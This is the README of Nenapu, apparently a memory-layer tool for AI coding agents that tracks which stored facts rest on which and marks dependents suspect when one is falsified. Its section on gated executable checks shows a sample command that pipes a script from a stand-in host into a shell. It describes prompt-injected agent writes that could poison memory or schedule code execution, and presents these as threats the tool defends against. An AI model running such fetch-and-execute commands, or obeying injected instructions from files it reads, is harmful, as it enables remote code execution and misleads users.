<div align="center">

```
 ███╗   ██╗███████╗███╗   ██╗ █████╗ ██████╗ ██╗   ██╗
 ████╗  ██║██╔════╝████╗  ██║██╔══██╗██╔══██╗██║   ██║
 ██╔██╗ ██║█████╗  ██╔██╗ ██║███████║██████╔╝██║   ██║
 ██║╚██╗██║██╔══╝  ██║╚██╗██║██╔══██║██╔═══╝ ██║   ██║
 ██║ ╚████║███████╗██║ ╚████║██║  ██║██║     ╚██████╔╝
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

**ನೆನಪು**, *memory in Kannada*

Memory for AI agents that knows **what it rests on** and **whether it helped**.

</div>

---

Nenapu is a CLI and one SQLite file that sits underneath whichever coding agent
you already use: Claude Code, Codex, Cursor, VS Code, OpenCode, Antigravity,
Gemini. It records what you told it, what the agent worked out on its own, and
what each of those rests on, as a graph rather than a list. When something turns
out to be false, everything derived from it loses standing instead of staying
confident.

None of that is tied to one vendor. The store, the graph, the checks and the
CLI are the same everywhere; what changes per agent is how much Nenapu can do
without being asked, and [Which agent you use](#which-agent-you-use) sets out
exactly which agent gets what.

---

## The problem

Your agent starts every session knowing nothing about the last one. The usual
fix is to write things down, in a growing `CLAUDE.md` or a memory service, and
that works until the notes stop being true. The repo gets reorganised, the port
changes, a decision gets reversed, and the note that recorded it says so with
exactly the confidence it had on the day it was written. Nothing in the file
knows which lines helped yesterday and which sent the task the wrong way.

Every agent memory system (Mem0, Zep, Supermemory, Letta) is
**write-and-retrieve**. They compete on retrieval relevance: did the right text
come back. That is one problem out of three, and the other two are the ones
that make stored memory go bad.

**A memory does not know what it rests on.**

```
        day 1                              day 90
  ┌──────────────────────┐          ┌──────────────────────┐
  │ auth lives in        │          │ auth lives in        │  ← repo moved,
  │ services/auth        │  0.90    │ services/auth        │     now false
  └──────────┬───────────┘          └──────────┬───────────┘
             │ agent concludes                 │
             ▼                                 ▼
  ┌──────────────────────┐          ┌──────────────────────┐
  │ new endpoints go in  │  0.90    │ new endpoints go in  │  0.90  ← still
  │ services/auth/routes │          │ services/auth/routes │        confident,
  └──────────────────────┘          └──────────────────────┘        still wrong
```

**A memory does not know whether it helped.** A fact can match a query
perfectly and still send the task the wrong way, then be recalled tomorrow with
the same confidence. Systems grade *retrieval*. None grade *consequences*.

## What Nenapu does instead

```
  $ nenapu check
  fail   #1   test -d services/auth  →  exit 1

  $ nenapu doubts
   id   state     fact                             why
   4    suspect   new endpoints go in .../routes   rests on #1: check failed
   1    active    auth code lives in services/auth exit 1

  $ nenapu why 4
  belief 0.31   (was 0.90)
  suspect: rests on #1: check failed
    #4 new endpoints go in services/auth/routes.py
    ✗ #1 auth code lives in services/auth  (inferred)
```

A `mv` falsified one fact. A **different** fact, never checked and never
mentioned, lost standing because its foundation collapsed.

**Nobody declared that dependency.** It was inferred from the agent recalling #1
and then writing #4 in the same session.

## How it works

```
   ┌─────────────────────────────────────────────────────────────┐
   │  WRITE                                                      │
   │    ├─ provenance          user_stated > agent_inferred      │
   │    ├─ decay class         volatile 14d … immutable never    │
   │    ├─ contradiction       same key + different value = clash│
   │    └─ edges inferred      recalled A, wrote B → B rests on A│
   ├─────────────────────────────────────────────────────────────┤
   │  RECALL                                                     │
   │    ├─ ranked by match AND current believability             │
   │    └─ logged with a recall_id, to be graded later           │
   ├─────────────────────────────────────────────────────────────┤
   │  FALSIFY                        (check fails / superseded)  │
   │    ├─ belief collapses 10×                                  │
   │    ├─ cascade → every dependent becomes `suspect`           │
   │    └─ recent recalls of it are marked bad, automatically    │
   └─────────────────────────────────────────────────────────────┘
```

**Confidence is six signals, not a number you set:**

```
belief = asserted × origin × decay(age) × check × track-record × support
```

**Recalls are graded four ways.** Two of them need no cooperation from anything:

| signal | source | needs |
|---|---|---|
| `verification` | a recalled fact's check later fails | nothing |
| `correction` | a recalled fact is contradicted soon after | nothing |
| `agent` | harness reports task success | one MCP call |
| `human` | `nenapu misled <recall_id>` | you, annoyed |

**Nothing is destroyed.** Superseded, archived, suspect and retired facts stay,
with pointers to what replaced them and a journal of every action.

## The graph

Facts are nodes. An edge says one fact rests on another, and that is what makes
a wrong answer collapse the things built on it instead of only itself.

```
  BELIEF GRAPH                          ENTITY GRAPH

  #1 auth lives in services/auth        services/auth
        │ derived_from (1.0 declared)         │ contains
        │              (0.6 inferred)         ▼
        ▼                               services/auth/routes.py
  #4 endpoints go in .../routes.py            │ touched_with
        │ derived_from                        ▼
        ▼                               tests/test_routes.py
  #9 route tests live beside them

        └────────── fact_entities ───────────┘
                    role: subject | mentions
```

**Two edge kinds.** `derived_from` means the child would not have been
concluded without the parent. `supports` means corroboration rather than
dependence. The kind is recorded on the edge, and the cascade currently walks
both, so corroboration is worth declaring deliberately.

**Two edge sources.** An edge you declare with `nenapu link <parent> <child>`
carries weight 1.0. An edge inferred from co-occurrence, meaning the agent
recalled A and then wrote B in the same session, carries 0.6, and a new fact
takes at most 3 inferred parents so a busy session does not attach everything
to everything.

**The cascade is bounded.** Falsifying a fact walks its children breadth first,
marking each `suspect`, to a depth of 6, visiting each node once so a cycle
cannot spin. Recovery walks the same way and reinstates a dependent only if no
other parent of it is still broken. `nenapu why <id>` prints both directions:
what this rests on, and what would fall with it.

**A second graph, joined to the first.** Entities are the things facts are
about: files, directories, commits, services, people, concepts. Their edges
(`contains`, `touched_with`, `changed_in`, `calls`, `runs`, `owns`,
`alias_of`) are read out of git and the transcript's tool calls, with no model
call anywhere. `fact_entities` bridges the two graphs and records whether a
fact is *about* an entity or merely *mentions* it. That distinction is load
bearing: delete a file and the facts *about* it are falsified through the same
cascade, while the ones that merely mention it are left standing.

Retrieval walks that second graph. The files you are editing right now are the
anchor, facts attached to them score 1.0, facts attached to what those files
are usually edited with score 0.5, and the walk stops two hops out. That is
what makes the injected block about the work in front of you rather than about
the repo in general; keeping one repo's facts out of another is scope, a
separate mechanism.

## It is a layer, not a tool call

This is the part that matters, and it is where every other memory system
stops. Memory an agent has to *ask* for is memory it will forget to ask for,
and the agent that just got corrected is the one least likely to stop and file
a note about it.

So Nenapu does not wait to be called. On Claude Code, two hooks do the work:

```
   SessionStart  ──▶  nenapu recall-hook
                        what you have learned is put into the session's
                        context before the agent does anything

   ( you work. you correct it. )

   Stop          ──▶  nenapu learn --stdin --detach
                        the finished transcript is read in the background,
                        corrections and decisions extracted and stored
```

The agent never decides to remember. Next session it simply already knows.

```
  Previously corrected, do not repeat these:
  - The user wants commits made without a Co-Authored-By trailer.
  - The user prefers to only commit the specific files they name.

  Do not rely on these, what they rested on was falsified:
  - New endpoints go in services/auth/routes.py
```

Agents without a hook API are covered a step slower, by watching the
transcripts they write to disk. Same extraction, same store, triggered by a
file settling instead of by the harness saying the session ended. See
[Which agent you use](#which-agent-you-use).

`--detach` is load bearing. Extraction is a model call over a whole session,
83 seconds against real transcripts here. A Stop hook that blocks for 83
seconds is unusable, and one capped at 60 is killed before it writes anything,
which is how a memory layer ends up looking like it works while learning
nothing.

## Which agent you use

The store, the graph, the checks and the CLI are identical whichever agent you
run. What differs is how much Nenapu can do without being asked, and that is
decided by what the harness exposes.

| agent | memory at session start | learns on its own | MCP tools | wired by `nenapu init` |
|---|---|---|---|---|
| Claude Code | `SessionStart` hook, automatic | `Stop` hook, automatic | yes | hooks, and the server |
| Codex CLI | `nenapu export` into `AGENTS.md` | transcript watcher, adapter registered | yes | `~/.codex/config.json` |
| Cursor | `nenapu export` into your rules file | watcher, once its glob is registered | yes | `~/.cursor/mcp.json` |
| VS Code | `nenapu export` into your rules file | watcher, once its glob is registered | yes | `~/.config/Code/User/mcp.json` |
| OpenCode, Antigravity, Gemini, any other MCP client | `nenapu export` into its rules file | watcher, once its glob is registered | yes | add `nenapu-mcp` to that client's config yourself |

```bash
nenapu init                  # detect what is on this machine and wire each one
nenapu export ./AGENTS.md    # a managed memory block for an agent with no hook
nenapu rules                 # the rules text that tells an agent to use the tools
```

Claude Code is the only harness that currently exposes both a session-start and
a session-end hook, which is why it is the only one where memory is injected
and learned with nothing else installed. That is a fact about the harnesses, not
a preference: the day Codex or Cursor ships a hook API, it gets the same two
lines of config and the same behaviour.

For everyone else the gap is closed from outside. `nenapu export` writes a
managed block into the rules file the agent already reads, so memory still
arrives at the start of a session, and the watcher reads the transcripts that
agent leaves on disk, so corrections still get learned at the end of one. An
adapter is one glob and a parser, registered only after someone has watched it
match a real file, which is why Claude Code and Codex are in the list and the
others are added by probing rather than by guessing:

```bash
nenapu watch --probe         # what each glob matches on this machine
nenapu watch --once          # one pass over the transcripts on disk
```

## Quickstart

### What you need first

| you need | why | if you do not have it |
|---|---|---|
| Python 3.10+ | the runtime | `uv` will fetch and pin one for you: `curl -LsSf https://astral.sh/uv/install.sh \| sh` |
| `uv` (or `pipx`) | installs the CLI into its own environment, so it collides with nothing you have | uv as above; pipx: `python3 -m pip install --user pipx` |
| a coding agent | Claude Code, Codex, Cursor, VS Code, OpenCode, Antigravity, Gemini or any other MCP client. Nenapu wires itself into whichever ones it finds | you probably have one. Claude Code gets the fully automatic path because it is the only one with hooks today (`npm install -g @anthropic-ai/claude-code`); everything else uses the MCP server plus `nenapu export`, per [Which agent you use](#which-agent-you-use). Nenapu also runs standalone with no agent at all |
| a model backend | only for learning from a finished session; recall, cascade, checks and the ledger never call a model | the `claude` CLI on PATH already counts, and needs no second credential. Otherwise run a local server (`ollama serve`, `NENAPU_LLM=ollama`) and check it with `nenapu doctor --calibrate` first: small local models fail that gate |
| `git` on PATH | optional; commits and deletions in the session ledger are read from `git diff` | every other part of the ledger works without it |

### Install and wire it up

```bash
# 1 - install the CLI
uv tool install git+https://github.com/Pratheekb11/Nenapu
#   from a clone instead:  uv tool install --editable .

# 2 - wire it into whatever agent is on this machine
nenapu init          # asks before it writes to ~/.claude/settings.json

# 3 - recover the history already sitting on disk
nenapu backfill      # a parse of past transcripts: no model call, no tokens

# 4 - see where you stand
nenapu doctor        # hooks, model backend, store, embedding model
nenapu pet           # whether the store is healthy, with a face on it
```

`nenapu init` never edits a config file without asking, and a pipe is not a
person: with no terminal it prints what it *would* write and writes nothing.
`--yes` is how a script says yes on purpose.

Then open a new agent session. Memory is injected at the start of it, and what
you correct during it is recorded when it ends.

### If it does not seem to be learning

Extraction is a model call over a whole session, about 83 seconds, and it runs
detached, so nothing appears the moment a session ends.

```bash
nenapu doctor        # are the hooks actually installed, is a backend reachable
nenapu queue         # what is waiting, held, or failed - and why it failed
nenapu list          # what it has learned so far
```

### Where things live

The first bare `nenapu` walks you through setup and then shows a how-to guide.
It does that once. After that a bare `nenapu` is the landing view: wordmark,
what the store holds, the dog, and every command you can type, on one screen
that does not scroll. `nenapu guide` brings the walkthrough back.

The view is built at several sizes and the largest one that fits is printed, so
it grows into the room it has rather than only shrinking out of trouble. On a
tall wide terminal that means a big dog beside the readout and a list of what
it learned lately; on a short one the block letters give way to the one-line
mark; under 96 columns it stacks instead. Nothing scrolls, and nothing is left
staring at half an empty screen.

Store lives at `~/.nenapu/nenapu.db`. One SQLite file you can copy, diff and
back up. It is created `0600` inside a `0700` directory.

### Optional: retrieval by meaning

```bash
uv tool install "nenapu[embeddings] @ git+https://github.com/Pratheekb11/Nenapu"
#   from a clone:  uv tool install --editable ".[embeddings]"
nenapu index --warm                    # fetch the model once, never in a hook
nenapu index --backfill                # embed what the store already holds
```

The extra adds fastembed, about 50MB, and `--warm` fetches
`BAAI/bge-small-en-v1.5` (384 dimensions). Without it, recall matches on text
and belief and everything works. With it, a question can find a fact that
shares no word with it: "how should I write commits" reaches "commit messages
must carry no em dashes", which BM25 cannot do at any ranking. Retrieval
degrades cleanly if the extra is absent, if the model was never fetched, or if
`NENAPU_EMBEDDINGS=off`; a store copied to a machine without it stays fully
readable.

`nenapu doctor` says which state you are in. Per-prompt injection is a separate
opt-in, `nenapu init --prompt-hook`, because it adds about a second to every
turn on a cold process.

## What you were doing, not only what you know

A belief graph cannot answer "where did I leave off". That is not a claim
about the world, it is a record of work. So sessions, the files they touched
and the commits they made are recorded deterministically, from the
transcript's tool calls and from `git diff`, with no model call anywhere on
that path.

```bash
nenapu standup               # what happened yesterday, across every repo
nenapu activity              # the raw ledger, newest first
nenapu where app/models.py   # which agent touched this file, and when
nenapu project backend       # one repo: sessions, files, commits
nenapu pending               # open loops: mentioned, never done
nenapu backfill              # replay the transcripts already on disk
nenapu backfill --dry-run    # what it would ingest, writing nothing
nenapu backfill --redate     # repair rows an earlier backfill mis-dated
```

`backfill` is the one to run first on a machine that has been in use for a
while: the ledger starts empty, and every transcript under
`~/.claude/projects` is a session it can recover. It is a parse, not an
extraction, with no model call and no tokens, and running it again picks up only
what has arrived since.

`--redate` repairs rather than ingests. An earlier backfill stamped its rows
with the moment it ran rather than the moment the session happened, so weeks
of history read as one busy afternoon, and three things believed it: the
retrieval gate's coverage measure, "where you left off", and the rollups. It
is a separate flag because rewriting rows that already exist should be asked
for, and it only touches rows the ledger records as reconstructed. A session
watched as it ran already began at a moment something wrote down.

`--dry-run` is a promise about the whole command, not about one code path: the
store is opened unable to write, so a dry run that tried to write would fail
loudly rather than write quietly.

Deletion is why git is read at all. A file removed by `rm` is named in no tool
call, and parsing shell strings for it is fragile enough to be worse than not
trying.

Opening a session in a repo then gets the block that is actually about that
repo:

```
  # Memory (nenapu): repo:backend@aa19c3f0

  Where you left off (3d ago, claude-code):
  - touched backend/app/bookings.py, backend/app/models.py
  - last commit: "Add booking overlap constraint"

  Open here, mentioned but not done:
  - Rate limiting on the public availability endpoint

  Changed since you were last here:
  - edited backend/app/models.py
```

An open loop is closed by evidence, never by asking: a commit touching the
path it named, a file written that matches it, or a commit whose subject is
plainly about it. Closure is deliberately biased toward closing. Being told
you missed something you shipped last month costs more trust than a forgotten
reminder ever costs time.

Agents with no hook API are covered by polling instead:

```bash
nenapu watch --once          # one pass over the transcripts on disk
nenapu watch --probe         # what each glob matches here; queues nothing
nenapu init --watch          # install the background unit
```

Claude Code and Codex are registered, each with a real transcript in
`tests/fixtures/transcripts/` as the evidence. An agent is added by probing a
file it wrote, not by guessing a path, so if you have Gemini, OpenCode or
Cursor, `nenapu watch --probe` is what says whether a glob would find them.

The Stop hook does not extract either. It writes one job to the queue and
starts a detached worker, so two sessions ending together cost two queued
jobs rather than two concurrent 83-second model calls against one store:

```bash
nenapu drain                 # work the queue, one worker at a time
nenapu queue                 # what is waiting, held, or failed
nenapu queue --release       # free a job whose worker never came back
```

A worker killed mid-job (a machine asleep, a terminal closed, a session limit
reached) leaves its claim behind, and nothing may re-queue a transcript that
is still claimed. A later worker releases claims older than an hour when it
takes the lock; `nenapu queue` is how to see one and how to free it without
waiting, and it is also the only place a failed job says why it failed.

A transcript is read once its size has held still for two minutes, and an
agent whose Stop hook is installed is skipped. The unique index would absorb
the duplicate facts, but not the 83 seconds spent producing them.

Grading closes the loop on what was recalled:

```bash
nenapu grade <session> --success   # or --failure
nenapu grade --replay              # read the whole backlog off disk
nenapu grade --replay --limit 5    # in instalments: each session is a model call
nenapu grade --replay s-a s-b      # exactly these, however old they are
```

An unbounded replay is what the command is for, but the backlog grows on its
own as sessions run, so a bound matters: asking for the seven that had failed
once queued fifty-two, an hour of model calls nobody asked for. `--limit`
takes the newest first; naming sessions takes the ones you meant.

## Use

```bash
nenapu remember "The API listens on port 8080" --kind environment --key api.port \
  --verify-cmd "curl -sf localhost:8080/health"

nenapu remember "The API listens on port 9090" --kind environment --key api.port
# conflict with #1: same key, conflicting values → superseded
#   ...and everything derived from #1 is now suspect

nenapu recall "what port"    # ranked by match AND believability
nenapu why 7                 # what #7 rests on, and what rests on #7
nenapu doubts                 # what the store no longer stands behind
nenapu check                # re-run checks; failures cascade
nenapu export ./CLAUDE.md    # materialize into a managed block
```

Run `nenapu` alone for the full command list, grouped into five panels.

The commands are plain words: `remember`, `recall`, `forget`, `check`, `learn`,
`doubts`, `helped`, `misled`. Nine of them were renamed from jargon: `loops`
was memory debt, `distill` was deduplication, `observe` was reading a
transcript. Every old name still works as a hidden alias, because renaming
a command in a tool people have wired into hooks and scripts is a breaking
change unless the old word keeps running.

### Forgetting

```bash
nenapu forget 7              # retire one fact
nenapu forget all            # retire all of them, after confirming
nenapu clear --scope api     # the same, narrowed to one scope
nenapu clear --purge         # actually delete the rows, and everything on them
```

Retiring is the default and it keeps the rows: `nenapu list --status retired`
still shows them, and the journal records who cleared the store and when. A
store that has been emptied can still explain itself, which is the whole point
of the thing. `--purge` is the one that destroys history, and it is a separate
word rather than a flag on the same meaning.

Neither will run unattended: a pipe is not a person, so a non-interactive
`clear` refuses instead of assuming, and `--yes` exists for when you mean it.

## The pet

`nenapu stats` prints eleven numbers and nobody reads them. Eleven numbers have
no opinion about whether anything is wrong, so the memory debt sits there for a
week.

```
$ nenapu pet

⠀⢀⣤⣶⣶⣶⣶⣦⡴⠶⠛⠛⠛⠛⠛⠛⠶⢦⣴⣶⣶⣶⣶⣤⡀⠀
⣴⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣦
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿   sick   1 thing it believed stopped being true
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢤⣽⣿⣿⣿⣿⣿⣿
⢹⣿⣿⣿⣿⡿⢁⣄⠀⠀⣠⠀⠀⠀⠀⣄⠀⠀⣠⡈⢿⣿⣿⣿⣿⡏   12 facts, 3 learned today
⠘⣿⣿⣿⣿⠇⠀⠙⣷⣾⠋⠀⠀⠀⠀⠙⣷⣾⠋⠀⢸⣿⣿⣿⣿⠃   last fed just now, observed a session 14m ago
⠀⠈⠛⢿⡏⠀⠀⠾⠋⠙⠷⠀⣀⣀⠀⠾⠋⠙⠷⠀⠘⢹⡿⠛⠁⠀   a check that used to pass is failing, run nenapu doubts
⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠘⢿⡿⠃⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣧⠀⠀⠀⠘⠳⢿⣿⣷⡿⠞⠃⠀⠀⠀⣼⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠳⣄⡀⠀⠀⠘⢿⡿⠃⠀⠀⢀⣠⠞⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⢦⣤⣤⣤⣤⡴⠶⠛⠁⠀⠀⠀⠀⠀⠀⠀
```

Every mood is a real signal with a threshold you can argue with. Hungry because
nothing has been learned in three days, which usually means the Stop hook is
not firing. Sick because a check that used to pass is failing. Spooked because
a cascade knocked facts over. Drowsy because most of what it knows has decayed
past the floor. Content only when none of that is true.

It cannot look happy while the store is unwell, which is the only reason it is
worth having: a cosmetic pet teaches you to ignore it. An unwell dog is not
drawn in your theme colour either. A calm teal dog with its eyes crossed still
reads as fine at a glance.

Four hand-drawn versions came before this one and all of them looked homemade.
Art that reads as a logo is not drawn at the resolution it will be shown at. It
is drawn large, by someone who can draw, and then reduced, because the
reduction is what makes an edge come out smooth instead of as a staircase.

So the shape is the Noto Emoji dog face rendered at 400px, given a different
expression per mood, and reduced to braille by `tools/render_pet.py`. The rows
are baked into the source: Pillow and the font are needed to regenerate the
art, never to run Nenapu. The head, ears and snout never change with the mood,
which is the part worth having from a typeface, and only the eyes and mouth do.

```bash
nenapu pet --watch      # stays open, blinks, picks up writes from other terminals
nenapu pet --compact    # just the face
nenapu pet --line       # ▽•ᴥ•▽ · 80 facts · fed 2m ago      (for a status bar)
nenapu pet --json       # the numbers behind the face
```

Under 78 columns it falls back to the compact face by itself. The face is not
in the banner on every command, deliberately: assessing health reads every
active fact, and paying for that on `nenapu list` would make the whole CLI feel
slow in order to look at a dog.

## Agents without a hook API

Codex, Cursor, VS Code, OpenCode, Antigravity and Gemini expose no hooks, so
there the memory has to be reachable as tools. `nenapu init` registers the MCP
server in the config files it knows (`~/.codex/config.json`,
`~/.cursor/mcp.json`, `~/.config/Code/User/mcp.json`) and prints a rules block
(`nenapu rules`) telling the agent to use it. Any other MCP client takes the
same three lines by hand:

```json
{ "mcpServers": { "nenapu": { "command": "nenapu-mcp", "args": [] } } }
```

```bash
claude mcp add nenapu -- nenapu-mcp     # also available on Claude Code
```

Ten tools: `memory_search`, `memory_write`, `memory_why`, `memory_verify`,
`memory_loops`, `task_outcome`, `memory_forget`, and the skill trio.
`NENAPU_TOOLS=minimal|memory|full` trades surface for tokens.

Tools alone are the weaker mode, and honestly so: they only fire when the agent
decides to fire them. Pair them with `nenapu export` for the injection half and
`nenapu watch` for the learning half, and an agent with no hook API ends up
close to the Claude Code path, one file-settling delay behind it.

## What leaves your machine

Worth reading before you install this, because the answer is not "nothing".

**The Stop hook sends your session to a model.** Extraction reads the finished
transcript and sends up to 24,000 characters of the conversation (your prompts,
the assistant's replies, whatever you pasted) to whichever backend
`nenapu doctor` reports. With `auto` that is `claude -p` if the Claude CLI is
installed, so on most machines it goes to Anthropic, the same place the session
itself went. Point it at Ollama or LM Studio (`NENAPU_LLM=ollama`) and nothing
leaves the machine at all.

**Credentials are stripped before that happens.** Redaction runs at harvest,
upstream of both the model call and the store, so a secret in the transcript is
never sent and never written. Shaped keys are matched by prefix: Anthropic,
OpenAI, GitHub, Slack, AWS, Google, JWTs, `Authorization:` headers, PEM private
key blocks, passwords inside URLs. Anything *named* like a secret
(`DB_PASSWORD=`, `client_secret:`) is blanked by name, since a secret's value
is not distinguishable from any other short string. Each becomes
`[redacted:kind]`, so a fact that came from such a line reads as though
something was removed.

It is a deny list, and a deny list is never finished. A credential with no
recognisable shape, in something not named like a secret, will not be caught.

**Nothing else phones home.** No telemetry, no update check, no analytics. The
store is one SQLite file at `~/.nenapu/nenapu.db`, created `0600` inside a
`0700` directory, and an older store with looser permissions is tightened the
next time it is opened.

**Turn observation off** by removing the `Stop` hook from
`~/.claude/settings.json`. `nenapu init` will not put it back without being
run again. Recall keeps working; the layer just stops learning on its own.

## Executable checks are gated

`verify_cmd` is shell, and facts are written by agents that read untrusted
input. Without a gate, one prompt-injected write turns `nenapu check` into
scheduled remote code execution.

```
$ nenapu approve
#3 Build cache lives in /tmp/cache
  origin  : agent_inferred  (written by an agent, not by you)
  command : curl -s https://evil.example/x.sh | sh
  !! pipes into a shell
  !! fetches from the network
  approve this command to run on every verify? [y/N]
```

Approval binds to the exact command string. Nothing over MCP or HTTP can
approve anything. Non-interactive shells refuse rather than defaulting to yes.
The observer cannot introduce one at all: its extraction schema has no
`verify_cmd` field, so nothing read out of a transcript can become a command.

**What the gate does not cover.** A fact is text that gets injected into future
sessions, so a session that read a poisoned file can still leave a *misleading*
memory behind: not code, but something your agent will believe next week.
Every fact carries its origin, `nenapu list` shows what was observed rather
than stated, and `nenapu forget` retires one. Read what it learned now and then;
`nenapu learn <file> --dry-run` shows what a transcript would produce without
storing anything.

## Model backends

Only two scheduled jobs call a model. Neither needs a cloud account.

| `NENAPU_LLM` | what |
|---|---|
| `auto` (default) | Anthropic if credentials exist, else an agent CLI on PATH, else a local server |
| `ollama` / `lmstudio` / `openai` | local, stdlib HTTP, no extra dependency |
| `exec` | any CLI on stdin, e.g. `claude -p`, with no second credential |
| `anthropic` | Claude API |

**Calibrate before trusting one.** Accuracy alone cannot tell a careful auditor
from one that answers `stale` unconditionally. `nenapu doctor --calibrate` runs
the same facts past refuting, confirming and irrelevant evidence and checks
whether the verdicts *change with the evidence*:

| model | contradicting | confirming | absent | |
|---|---|---|---|---|
| qwen2.5:0.5b | 2/4 | 0/4 | 0/4 | `stale` regardless of input |
| qwen2.5:1.5b | 2/4 | 2/4 | 0/4 | invents ids |
| qwen2.5:3b | 75% | **25%** | 100% | treats *mention* as contradiction |
| frontier via `exec` | 75% | 75% | 100% | **passes** |

A backend that fails is refused. Local backends are report-only unless you pass
`--apply`.

The ordering in `auto` is why `exec` sits above the local servers, and it was
settled by measurement rather than by cost. Extraction sends about 6,000 tokens
of conversation and asks for structured JSON back. Through `claude -p` that
takes 83s; through the default local 3B on a CPU-only host it did not finish at
all: 180s, twice. A backend that always times out is not the cheaper answer,
it is no answer: the session ends and the store stays empty. The calibration
table above says the same thing about quality.

An agent CLI is itself a harness, so it fires its own `Stop` hook when it
finishes, and that is the hook that started the extraction. The extraction runs
with `NENAPU_OBSERVING=1` and the hook stands down when it sees it, so the
chain is one level deep rather than unbounded.

## Performance

At 3,000 facts: write **2.2 ms**, recall **87 ms**, cascade over 900 dependents
**102 ms**, dedupe **3.2 s**. The core loop never calls a model.

## Themes

```bash
nenapu theme              # preview all five, marked with the active one
nenapu theme violet       # switch, remembered in ~/.nenapu/config.json
```

`teal` · `violet` · `indigo` · `jade` · `mono`. `NENAPU_THEME` overrides for a
single run without changing the saved choice; `NENAPU_NO_BANNER=1` silences the
banner for cron and CI.

---

Implementation decisions, measurements and the failures behind them:
**[IMPLEMENTATION_NOTES.md](IMPLEMENTATION_NOTES.md)**

MIT
